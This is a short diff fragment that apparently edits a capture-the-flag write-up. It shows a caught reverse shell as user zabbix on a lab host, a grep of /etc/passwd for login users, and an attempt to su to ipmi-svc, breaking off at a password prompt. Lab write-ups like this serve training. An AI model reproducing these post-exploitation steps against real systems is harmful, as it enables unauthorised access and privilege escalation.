@@ -237,4 +237,14 @@ listening on [any] 9001 ...
 connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 50404
 bash: cannot set terminal process group (1201): Inappropriate ioctl for device
 bash: no job control in this shell
-zabbix@shibboleth:/$ ls
+
+zabbix@shibboleth:/home/ipmi-svc$ grep 'bash' /etc/passwd
+grep 'bash' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
+zabbix@shibboleth:/home/ipmi-svc$ su ipmi-svc
+su ipmi-svc                                                                                                                                                                                                                                
+Password:
+
+
+
